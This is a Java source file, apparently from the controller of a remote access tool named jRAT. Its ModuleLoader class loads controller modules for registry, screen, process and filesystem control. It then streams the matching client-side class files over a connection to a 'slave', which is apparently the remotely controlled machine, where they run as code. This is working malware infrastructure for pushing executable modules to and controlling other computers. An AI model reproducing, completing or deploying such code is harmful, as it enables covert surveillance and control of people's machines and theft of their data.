package jrat.controller.modules;

import jrat.common.Logger;
import jrat.controller.AbstractSlave;
import jrat.api.Module;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;

public class ModuleLoader {

    /**
     * Temporary class that holds necessary module data
     */
    private static class ModuleData {

        public String pathPrefix;
        public String controllerMain;

        public ModuleData(String pathPrefix, String controllerMain) {
            this.pathPrefix = pathPrefix;
            this.controllerMain = controllerMain;
        }

        public File getControllerFile() {
            return new File("modules", this.pathPrefix + "-controller.jar");
        }

        public File getClientFile() {
            return new File("modules", this.pathPrefix + "-client.jar");
        }
    }

    private static final List<ModuleData> modules = new ArrayList<ModuleData>();

    static {
        modules.add(new ModuleData("registry", "jrat.module.registry.RegistryControllerModule"));
        modules.add(new ModuleData("screen", "jrat.module.screen.ScreenControllerModule"));
        modules.add(new ModuleData("process", "jrat.module.process.ProcessControllerModule"));
        modules.add(new ModuleData("fs", "jrat.module.fs.FileSystemControllerModule"));
    }

    /**
     * Load all server side modules
     */
    public static void load() {
        Logger.log("Loading " + modules.size() + " modules...");

        for (ModuleData mod : modules) {
            try {
                // add module JAR to classpath
                Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
                method.setAccessible(true);
                method.invoke(ClassLoader.getSystemClassLoader(), mod.getControllerFile().toURI().toURL());

                // invoke init() on module
                Class<Module> clazz = (Class<Module>) ModuleLoader.class.getClassLoader().loadClass(mod.controllerMain);
                Constructor<?> ctor = clazz.getDeclaredConstructor();
                ctor.setAccessible(true);
                Module module = (Module) ctor.newInstance();
                module.init();
                Logger.log("\t" + mod.getControllerFile());
            } catch (Exception ex) {
                Logger.log("\t" + mod.getControllerFile() + " failed");
                ex.printStackTrace();
            }
        }
    }

    /**
     * Send all client side modules to the client
     * @param slave
     * @throws Exception
     */
    public static void send(AbstractSlave slave) throws Exception {
        Logger.log("Writing " + modules.size() + " modules...");
        slave.writeInt(modules.size());

        for (ModuleData mod : modules) {
            int total = 0;

            JarInputStream jis = new JarInputStream(new FileInputStream(mod.getClientFile()));

            Manifest mf = jis.getManifest();
            String mainClass = mf.getMainAttributes().getValue("Main-Class");

            slave.writeLine(mainClass);

            JarEntry entry;
            while ((entry = jis.getNextJarEntry()) != null) {
                int size = (int) entry.getSize();

                if (size == 0) {
                    continue;
                }

                ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

                int count;
                byte[] buffer = new byte[1024];
                while ((count = jis.read(buffer)) != -1) {
                    out.write(buffer, 0, count);
                }

                out.close();

                byte[] array = out.toByteArray();
                total += array.length;

                Logger.log("\twriting class " + entry.getName() + " (" + array.length + " b)");

                slave.writeBoolean(true);
                slave.writeBoolean(entry.getName().endsWith(".class"));
                slave.writeLine(entry.getName());
                slave.writeInt(array.length);
                slave.getDataOutputStream().write(array);
            }
            jis.close();

            // indicate that there are no entries left for this module
            slave.writeBoolean(false);
            Logger.log("wrote module '" + mainClass + "' (" + total + " b)");
        }
    }
}
